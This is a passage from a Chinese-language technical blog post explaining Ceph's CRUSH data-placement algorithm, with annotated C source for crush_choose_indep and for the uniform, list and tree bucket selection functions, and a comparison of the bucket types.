class="hljs-keyword">break</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// 获取当前 item 的类型</span><br>                <span class="hljs-keyword">if</span> (item &lt; <span class="hljs-number">0</span>)<br>                    itemtype = <span class="hljs-built_in">map</span>-&gt;buckets[<span class="hljs-number">-1</span> - item]-&gt;type;<br>                <span class="hljs-keyword">else</span><br>                    itemtype = <span class="hljs-number">0</span>;<br>                dprintk(<span class="hljs-string">&quot;  item %d type %d\n&quot;</span>, item, itemtype);<br><br>                <span class="hljs-comment">// 类型不匹配则继续寻找</span><br>                <span class="hljs-keyword">if</span> (itemtype != type) &#123;<br>                    <span class="hljs-comment">// item 已经为叶子节点，此时类型仍然不匹配，则无法继续向下寻找，因此结束当前流程。</span><br>                    <span class="hljs-comment">// item 并不是叶子节点，但是其 bucket id 大于 max_buckets ，意味着这是一个异常的</span><br>                    <span class="hljs-comment">// bucket，也结束当前流程。</span><br>                    <span class="hljs-keyword">if</span> (item &gt;= <span class="hljs-number">0</span> || (<span class="hljs-number">-1</span> - item) &gt;= <span class="hljs-built_in">map</span>-&gt;max_buckets) &#123;<br>                        dprintk(<span class="hljs-string">&quot;   bad item type %d\n&quot;</span>, type);<br>                        out[rep] = CRUSH_ITEM_NONE;<br>                        <span class="hljs-keyword">if</span> (out2) out2[rep] = CRUSH_ITEM_NONE;<br>                        left--;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br><br>                    <span class="hljs-comment">// 从当前 item 的 bucket 中继续往下寻找</span><br>                    in = <span class="hljs-built_in">map</span>-&gt;buckets[<span class="hljs-number">-1</span> - item];<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// 监测是否发生冲突，即是否找到相同的 item</span><br>                collide = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> (i = outpos; i &lt; endpos; i++) &#123;<br>                    <span class="hljs-keyword">if</span> (out[i] == item) &#123;<br>                        collide = <span class="hljs-number">1</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果存在冲突，则跳出当前循环</span><br>                <span class="hljs-keyword">if</span> (collide) <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-comment">// 是否需要递归检索到叶子节点</span><br>                <span class="hljs-keyword">if</span> (recurse_to_leaf) &#123;<br>                    <span class="hljs-comment">// 当前 item 非叶子节点</span><br>                    <span class="hljs-keyword">if</span> (item &lt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">// 继续往下一层检索</span><br>                        crush_choose_indep(<br>                            <span class="hljs-built_in">map</span>,<br>                            work,<br>                            <span class="hljs-built_in">map</span>-&gt;buckets[<span class="hljs-number">-1</span> - item],   <span class="hljs-comment">// @bucket: 下一次要检索的 bucket</span><br>                            weight,<br>                            weight_max,<br>                            x,   <span class="hljs-comment">// @x: 输入哈希值，对应为 pgp seed</span><br>                            <span class="hljs-number">1</span>,   <span class="hljs-comment">// @left: 在当前 bucket 中还需要选择的 item 的数量，只需要找到一个叶子节点即可</span><br>                            numrep,   <span class="hljs-comment">// @numrep: crush rule 中单个 step 定义的要选择的 item 数量</span><br>                            <span class="hljs-number">0</span>,   <span class="hljs-comment">// @type: crush rule 中单个 step 定义的要选择的 item 类型，这里为 osd 类型</span><br>                            out2,   <span class="hljs-comment">// @out: 选中的 item 的数组，由于这里是叶子节点，所以存入 out2 数组</span><br>                            rep,             <span class="hljs-comment">// @outpos: 选中的 item 要存储在数组中的索引</span><br>                            recurse_tries,   <span class="hljs-comment">// @tries: 这里传入的值为 recurse_tries 的值</span><br>                            <span class="hljs-number">0</span>,               <span class="hljs-comment">// @recurse_tries: 这里传入的值为 0</span><br>                            <span class="hljs-number">0</span>,               <span class="hljs-comment">// @recurse_to_leaf: 这里传入的值为 0</span><br>                            <span class="hljs-literal">NULL</span>,   <span class="hljs-comment">// @out2: 第二个输出向量用于叶 item，由于当前检索的就是叶子节点，所以该值为 0</span><br>                            r,   <span class="hljs-comment">// @parent_r: 从父级传递的 r 值</span><br>                            choose_args);<br><br>                        <span class="hljs-keyword">if</span> (out2 &amp;&amp; out2[rep] == CRUSH_ITEM_NONE) &#123;<br>                            <span class="hljs-comment">// 没有找到对应的叶子节点</span><br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-comment">// 当前 item 为叶子节点，直接记录该 item</span><br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (out2) &#123;<br>                        out2[rep] = item;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 叶子节点</span><br>                <span class="hljs-keyword">if</span> (itemtype == <span class="hljs-number">0</span> &amp;&amp; is_out(<span class="hljs-built_in">map</span>, weight, weight_max, item, x)) <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-comment">// 找到 item ，跳出当前循环</span><br>                out[rep] = item;<br>                left--;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 再次处理结果数组，如果内部还是未定义的 item ，则将其设置为 None</span><br>    <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123;<br>        <span class="hljs-keyword">if</span> (out[rep] == CRUSH_ITEM_UNDEF) &#123; out[rep] = CRUSH_ITEM_NONE; &#125;<br>        <span class="hljs-keyword">if</span> (out2 &amp;&amp; out2[rep] == CRUSH_ITEM_UNDEF) &#123; out2[rep] = CRUSH_ITEM_NONE; &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __KERNEL__</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;choose_tries &amp;&amp; ftotal &lt;= <span class="hljs-built_in">map</span>-&gt;choose_total_tries) <span class="hljs-built_in">map</span>-&gt;choose_tries[ftotal]++;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG_INDEP</span><br>    <span class="hljs-keyword">if</span> (out2) &#123;<br>        dprintk(<span class="hljs-string">&quot;%u %d a: &quot;</span>, ftotal, left);<br>        <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123; dprintk(<span class="hljs-string">&quot; %d&quot;</span>, out[rep]); &#125;<br>        dprintk(<span class="hljs-string">&quot;\n&quot;</span>);<br>        dprintk(<span class="hljs-string">&quot;%u %d b: &quot;</span>, ftotal, left);<br>        <span class="hljs-keyword">for</span> (rep = outpos; rep &lt; endpos; rep++) &#123; dprintk(<span class="hljs-string">&quot; %d&quot;</span>, out2[rep]); &#125;<br>        dprintk(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三、Bucket-算法详解"><a href="#三、Bucket-算法详解" class="headerlink" title="三、Bucket 算法详解"></a>三、Bucket 算法详解</h1><p><strong>不同类别的算法实现介绍:</strong></p><ul><li><code>uniform</code>: 它假定整个集群的设备容量是均匀的，并且设备数量极少变化，他不关心子设备中配置的权重，而是直接通过哈希算法将数据均匀的分布到集群中，时间复杂度 <code>O(1)</code>，优点是计算速度快，缺点是适用范围有限。</li><li><code>list</code>&#x2F;<code>tree</code>: 这两种属于分治算法，问题在于各子元素的选择概率是全局相关的，所以子元素的增加、删除和权重的改变都会在一定程度上影响全局的数据分布，由此带来的数据迁移量并不是最优的。<ul><li><code>list</code>: 它会逐一检查各个元素，并根据权重确定选中对应子元素的概率，时间复杂度 <code>O(n)</code>，优点是在集群规模不断增加时能最小化数据迁移，缺点是移除旧节点时会导致数据重新分配。</li><li><code>tree</code>: 它使用了二叉搜索树，让搜索到各子元素的概率与权重一致，时间复杂度 <code>O(logn)</code>，优点是较好适应集群规模的增减，缺点是 Ceph 实现有缺陷，不推荐使用。</li></ul></li><li><code>straw</code>&#x2F;<code>straw2</code>: <ul><li><code>straw</code> 会让所有子元素独立的互相竞争，类似于抽签机制，让子元素的签长基于权重分布，并引入一定的伪随机性，时间服复杂度为 <code>O(n)</code> ，由于子元素签长的计算仍然会依赖于其他子元素的权重，所以并没有能够完全解决最小数据迁移量问题。</li><li><code>straw2</code> 的提出解决了 straw 存在的问题，在计算子元素签长时不会依赖于其他子元素的状况，保证数据分布遵循权重分布，并且在集群规模变化时拥有最佳的表现。</li></ul></li></ul><p><strong>桶算法的比较:</strong></p><table><thead><tr><th align="center">桶算法</th><th align="center">选择的时间复杂度</th><th align="center">元素添加</th><th align="center">元素移除</th></tr></thead><tbody><tr><td align="center">uniform</td><td align="center">O(1)</td><td align="center">差</td><td align="center">差</td></tr><tr><td align="center">list</td><td align="center">O(n)</td><td align="center">良</td><td align="center">差</td></tr><tr><td align="center">tree</td><td align="center">O(log(n))</td><td align="center">优</td><td align="center">优</td></tr><tr><td align="center">straw</td><td align="center">O(n)</td><td align="center">更优</td><td align="center">更优</td></tr><tr><td align="center">straw2</td><td align="center">O(n)</td><td align="center">良</td><td align="center">良</td></tr></tbody></table><h2 id="3-1、Uniform-Buckets"><a href="#3-1、Uniform-Buckets" class="headerlink" title="3.1、Uniform Buckets"></a>3.1、Uniform Buckets</h2><p>在大型存储系统中，通常不会单独添加某个设备（个别故障除外），而是批量添加一组设备，用于扩容或者替换寿命到的设备。因此将它们视为一个单元是很自然的。在这种情况下，<code>uniform buckets</code> 用于表示一组相同的设备。这样做的主要优势在于性能：CRUSH 可以在常数时间内将副本映射到桶中。如果桶的大小发生变化，则设备之间的数据将完全重新排列，就像传统的基于哈希的分发策略一样。</p><p><strong>代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> crush_bucket_uniform* <span class="hljs-title function_">crush_make_uniform_bucket</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span>* items, <span class="hljs-type">int</span> item_weight)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_add_uniform_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_uniform* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_remove_uniform_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_uniform* bucket, <span class="hljs-type">int</span> item)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_adjust_uniform_bucket_item_weight</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_uniform* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_reweight_uniform_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_uniform* bucket)</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_uniform_choose</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket_uniform* bucket, <span class="hljs-keyword">struct</span> crush_work_bucket* work, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> r)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> bucket_perm_choose(&amp;bucket-&gt;h, work, x, r);<br>&#125;<br><br><span class="hljs-comment">// x 为 _pg_to_raw_osds 函数中计算出的 pps</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_perm_choose</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket* bucket, <span class="hljs-keyword">struct</span> crush_work_bucket* work, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> r)</span><br>&#123;<br>    <span class="hljs-comment">// 将 r 的值限制在 bucket 的大小范围内</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> pr = r % bucket-&gt;size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, s;<br><br>    <span class="hljs-comment">// 每次需要为 x 从 bucket 中选择多个 item ， 为此我们将 x 记录到 work-&gt;perm_x 字段中，</span><br>    <span class="hljs-comment">// 因此如果 work-&gt;perm_x 发生了变更，则代表需要为新的 x 选择 item ，需要重新计算排列。</span><br>    <span class="hljs-keyword">if</span> (work-&gt;perm_x != (__u32)x || work-&gt;perm_n == <span class="hljs-number">0</span>) &#123;<br>        dprintk(<span class="hljs-string">&quot;bucket %d new x=%d\n&quot;</span>, bucket-&gt;id, x);<br>        work-&gt;perm_x = x;<br><br>        <span class="hljs-comment">// 如果 pr 为 0 （即第一个副本），直接使用哈希函数计算一个索引，这是一个优化，因为大多数调用都是请求第一个副本。</span><br>        <span class="hljs-keyword">if</span> (pr == <span class="hljs-number">0</span>) &#123;<br>            s = crush_hash32_3(bucket-&gt;hash, x, bucket-&gt;id, <span class="hljs-number">0</span>) % bucket-&gt;size;<br>            work-&gt;perm[<span class="hljs-number">0</span>] = s;<br>            work-&gt;perm_n = <span class="hljs-number">0xffff</span>; <span class="hljs-comment">/* magic value, see below */</span><br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        <span class="hljs-comment">// 如果 pr 不为 0 ，且是新的序列，则初始化排列数组 perm ，使其包含从 0 到 bucket-&gt;size-1 的整数，</span><br>        <span class="hljs-comment">// 并且设置当前 work 中已经选择的 item 数量为 0 。</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; bucket-&gt;size; i++) work-&gt;perm[i] = i;<br>        work-&gt;perm_n = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 之前处理过 pr 为 0 的情况，则当前为第二次调用</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (work-&gt;perm_n == <span class="hljs-number">0xffff</span>) &#123;<br>        <span class="hljs-comment">// 初始化排列数组中下标 0 之后的位置</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; bucket-&gt;size; i++) work-&gt;perm[i] = i;<br><br>        <span class="hljs-comment">// 由于当 pr 为 0 的时候（即第一次计算 x 的排列数组的情况），已经获取了 bucket 中索引 s ，并将</span><br>        <span class="hljs-comment">// 该值记录到 work-&gt;perm[0] （即 work-&gt;perm[0] = s ），为了避免 work-&gt;perm 数组中出现 bucket 中</span><br>        <span class="hljs-comment">// 重复的索引，所以需要将 work-&gt;perm[s] 中记录的值设置为 bucket 的索引 0，即 work-&gt;perm[s] = 0 。</span><br>        work-&gt;perm[work-&gt;perm[<span class="hljs-number">0</span>]] = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 当前 work 中已经获取的 item 数量为 1 。</span><br>        work-&gt;perm_n = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; work-&gt;perm_n; i++) dprintk(<span class="hljs-string">&quot; perm_choose have %d: %d\n&quot;</span>, i, work-&gt;perm[i]);<br><br><br>    <span class="hljs-comment">// 这个条件检查当前已生成的排列长度（ work-&gt;perm_n ）是否小于或等于所需的副本位置 pr 。</span><br>    <span class="hljs-comment">// 如果是，需要继续生成排列直到达到这个位置。</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 通过不断交换元素位置，生成一个伪随机的排列，直到生成足够长的排列以覆盖所需的副本位置 pr 。</span><br>    <span class="hljs-comment">// 确保了数据的均匀分布和访问的随机性，是 CRUSH 算法处理数据分布的关键机制。</span><br>    <span class="hljs-keyword">while</span> (work-&gt;perm_n &lt;= pr) &#123;<br>        <span class="hljs-comment">// 这里 p 是当前排列的长度，即下一个要处理的排列位置。</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p = work-&gt;perm_n;<br><br>        <span class="hljs-comment">// 如果 p 已经是最后一个元素的位置，则没有后续元素可以与之交换，因此不执行交换。</span><br>        <span class="hljs-keyword">if</span> (p &lt; bucket-&gt;size - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 使用哈希函数 crush_hash32_3 基于桶的哈希种子、对象标识符 x 、桶的 id 和当前位置 p 计算一个哈希值。</span><br>            <span class="hljs-comment">// 然后取模操作确定在当前位置 p 之后的哪个位置与之交换。这保证了交换的随机性和均匀性。</span><br>            i = crush_hash32_3(bucket-&gt;hash, x, bucket-&gt;id, p) % (bucket-&gt;size - p);<br><br>            <span class="hljs-comment">// 如果 i 不为 0 （即当前位置 p 不是交换位置），则执行交换操作</span><br>            <span class="hljs-keyword">if</span> (i) &#123;<br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> t = work-&gt;perm[p + i];<br>                work-&gt;perm[p + i] = work-&gt;perm[p];<br>                work-&gt;perm[p] = t;<br>            &#125;<br>            dprintk(<span class="hljs-string">&quot; perm_choose swap %d with %d\n&quot;</span>, p, p + i);<br>        &#125;<br>        <span class="hljs-comment">// 每完成一次交换，排列长度增加 1 。</span><br>        work-&gt;perm_n++;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; bucket-&gt;size; i++) dprintk(<span class="hljs-string">&quot; perm_choose  %d: %d\n&quot;</span>, i, work-&gt;perm[i]);<br><br>    <span class="hljs-comment">// 从排列中获取 pr 位置的索引s，然后返回 bucket-&gt;items[s] ，即为选择的桶中的条目。</span><br>    s = work-&gt;perm[pr];<br>out:<br>    dprintk(<span class="hljs-string">&quot; perm_choose %d sz=%d x=%d r=%d (%d) s=%d\n&quot;</span>, bucket-&gt;id, bucket-&gt;size, x, r, pr, s);<br>    <span class="hljs-keyword">return</span> bucket-&gt;items[s];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-2、List-Buckets"><a href="#3-2、List-Buckets" class="headerlink" title="3.2、List Buckets"></a>3.2、List Buckets</h2><p><code>list buckets</code> 将其内容构建为链表，并且可以包含具有任意权重的项目。为了放置副本， <code>CRUSH</code> 从列表头部开始，包含最新添加的项目，并将其权重与所有剩余项目的权重之和进行比较。根据 <code>hash(x, r, item)</code> 的值，要么以适当的概率选择当前项目，要么该过程继续递归地沿着列表向下进行。这种方法源自 <code>RUSHp</code> ，将放置问题重新定义为 “最近添加的” 问题。 “是新项目，还是旧项目？” 对于不断扩展的集群来说，这是一个自然而直观的选择，要么以适当的概率将对象迁移到最新的设备，要么像以前一样保留在旧设备上。当项目添加到存储桶时，其结果是最佳的数据迁移。然而，从列表中间或尾部移除项目可能会导致大量不必要的移动，因此列表存储桶最适合于从不（或很少）收缩的情况。</p><p><code>RUSHp</code> 算法大致相当于一个两级 <code>CRUSH</code> 层次结构，由一个包含多个 <code>uniform buckets</code> 的 <code>list buckets</code> 组成。其固定的集群表示形式排除了使用放置规则或 <code>CRUSH</code> 故障域来控制数据放置以增强可靠性的可能性。</p><p><strong>代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> crush_bucket_list* <span class="hljs-title function_">crush_make_list_bucket</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span>* items, <span class="hljs-type">int</span>* weights)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_add_list_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_list* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_remove_list_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_list* bucket, <span class="hljs-type">int</span> item)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_adjust_list_bucket_item_weight</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_list* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_reweight_list_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_list* bucket)</span>;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_list_choose</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket_list* bucket, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> r)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = bucket-&gt;h.size - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-comment">// 这个哈希值是随机的，但是对于相同的输入总是产生相同的输出，保证了算法的确定性。</span><br>        __u64 w = crush_hash32_4(bucket-&gt;h.hash, x, bucket-&gt;h.items[i], r, bucket-&gt;h.id);<br><br>        <span class="hljs-comment">// 哈希值与 0xffff 进行 AND 操作，将哈希值限制在一个较小的范围内（即 0 到 65535 ）。</span><br>        w &amp;= <span class="hljs-number">0xffff</span>;<br>        dprintk(<span class="hljs-string">&quot;list_choose i=%d x=%d r=%d item %d weight %x &quot;</span><br>                <span class="hljs-string">&quot;sw %x rand %llx&quot;</span>,<br>                i,<br>                x,<br>                r,<br>                bucket-&gt;h.items[i],<br>                bucket-&gt;item_weights[i],<br>                bucket-&gt;sum_weights[i],<br>                w);<br>        <span class="hljs-comment">// 将结果乘以到目前为止的权重总和（ bucket-&gt;sum_weights[i] ），然后右移 16 位，进行缩小。</span><br>        <span class="hljs-comment">// 将哈希值缩放到一个与权重总和相关的范围内。</span><br>        w *= bucket-&gt;sum_weights[i];<br>        w = w &gt;&gt; <span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">// 如果缩小后的哈希值小于当前条目的权重，这意味着在从 0 到当前权重总和的范围内，只有当值落在当前条目</span><br>        <span class="hljs-comment">// 的权重范围内时，条目才会被选中。因此，条目被选中的概率正比于它的权重相对于权重总和的比例。</span><br>        <span class="hljs-keyword">if</span> (w &lt; bucket-&gt;item_weights[i]) &#123; <span class="hljs-keyword">return</span> bucket-&gt;h.items[i]; &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果所有条目都未被选择（理论上不应发生，除非权重配置错误），则打印错误信息，并默认返回列表中的第一个条目。</span><br>    dprintk(<span class="hljs-string">&quot;bad list sums for bucket %d\n&quot;</span>, bucket-&gt;h.id);<br>    <span class="hljs-keyword">return</span> bucket-&gt;h.items[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3、Tree-Buckets"><a href="#3-3、Tree-Buckets" class="headerlink" title="3.3、Tree Buckets"></a>3.3、Tree Buckets</h2><p>与任何链表数据结构一样，<code>list buckets</code> 对于较小的项目集非常高效，但对于较大的项目集可能不太适用，因为其 <code>O(n)</code> 运行时间可能过长。源自 <code>RUSHt</code> 的树形桶通过将其项目存储在二叉树中解决了这个问题。这将放置时间缩短至 <code>O(log(n))</code>，使其适合管理更大的设备集或嵌套桶。 <code>RUSHt</code> 相当于一个两级 <code>CRUSH</code> 层次结构，由一个包含多个 <code>uniform bucket</code> 的 <code>tree buckets</code> 组成。</p><p><code>tree buckets</code> 的结构为带权二叉搜索树，其项目位于叶子节点。每个内部节点都知道其左右子树的总权重，并根据固定策略进行标记（详见下文）。为了在存储桶中选择一个项目，CRUSH 从树的根节点开始，计算输入键 x、副本数量 r、存储桶标识符以及当前树节点（最初为根节点）的标签的哈希值。将结果与左右子树的权重比进行比较，以决定接下来要访问哪个子节点。此过程重复进行，直到到达叶子节点，此时存储桶中的相关项目将被选中。只需进行 <code>log(n)</code> 次哈希运算和节点比较即可定位项目。</p><p>存储桶的二叉树节点采用简单的固定策略标记二进制值，以避免在树增长或收缩时标签发生变化。树中最左边的叶子节点始终标记为 “1”。每次树扩展时，旧根节点都会成为新根节点的左子节点，并且树中最左边的叶子节点始终带有标签，新的根节点的标签将旧根节点的标签向左移动一位（例如 1、10、100 等）。树右侧的标签与左侧的标签相同，只是每个值前面都添加了一个 “1” 。一旦对象被放置在特定的子树中，其最终映射将仅取决于该子树中的权重和节点标签，并且只要该子树的项目保持不变，映射就不会改变。尽管分层决策树在嵌套项目之间引入了一些额外的数据迁移，但此策略将移动保持在合理水平，同时即使对于非常大的存储桶也能提供高效的映射。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">root default &#123;<br>        <span class="hljs-built_in">id</span> -1             <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-built_in">id</span> -2 class hdd   <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.6</span><br>        alg tree<br>        <span class="hljs-built_in">hash</span> 0  <span class="hljs-comment"># rjenkins1</span><br>        item host01 weight 0.2<br>        item host02 weight 0.2<br>        item host03 weight 0.2<br>&#125;<br></code></pre></td></tr></table></figure><p>假设一个 <code>bucket</code> 的信息如上，则根据上面的 <code>bucket</code> 生成的 <code>tree</code> 的基础信息为，<code>depth = 3</code> ，<code>num_nodes = 8</code> ，生成的树结构关系如下（相关代码参见 <code>crush_make_tree_bucket</code> 函数）:</p><p><img src="/assets/images/ceph-crush-tree-bucket-create.png" alt="Tree Bucket" loading="lazy"></p><p><strong>代码解析:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> crush_bucket_tree* <span class="hljs-title function_">crush_make_tree_bucket</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span>* items, <span class="hljs-type">int</span>* weights)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_add_tree_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_tree* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_remove_tree_bucket_item</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_tree* bucket, <span class="hljs-type">int</span> item)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_adjust_tree_bucket_item_weight</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_bucket_tree* bucket, <span class="hljs-type">int</span> item, <span class="hljs-type">int</span> weight)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_reweight_tree_bucket</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> crush_bucket_tree* bucket)</span>;<br><br><br><span class="hljs-comment">/* (binary) tree */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">height</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> h = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((n &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;<br>        h++;<br>        n = n &gt;&gt; <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br><br><span class="hljs-comment">// 计算给定节点 x 的左子节点的位置。这里的 h 是节点 x 的高度。</span><br><span class="hljs-comment">// 首先调用 height(x) 来获取 x 的高度，然后通过减去 2^(h-1) 来找到左子节点的位置。</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">left</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-type">int</span> h = height(x);<br>    <span class="hljs-keyword">return</span> x - (<span class="hljs-number">1</span> &lt;&lt; (h - <span class="hljs-number">1</span>));<br>&#125;<br><br><span class="hljs-comment">// 计算给定节点 x 的右子节点的位置。这里的 h 是节点 x 的高度。</span><br><span class="hljs-comment">// 首先调用 height(x) 来获取 x 的高度，然后通过加上 2^(h-1) 来找到右子节点的位置。</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">right</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-type">int</span> h = height(x);<br>    <span class="hljs-keyword">return</span> x + (<span class="hljs-number">1</span> &lt;&lt; (h - <span class="hljs-number">1</span>));<br>&#125;<br><br><span class="hljs-comment">// 检查节点 x 是否是一个叶子节点（即终端节点）。</span><br><span class="hljs-comment">// 在二进制表示中，如果最低位是 1 ，则节点是叶子节点。</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">terminal</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> x &amp; <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_tree_choose</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_bucket_tree* bucket, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> r)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    __u32 w;<br>    __u64 t;<br><br>    <span class="hljs-comment">// 从根节点开始</span><br>    n = bucket-&gt;num_nodes &gt;&gt; <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// 如果不是叶子节点</span><br>    <span class="hljs-comment">// 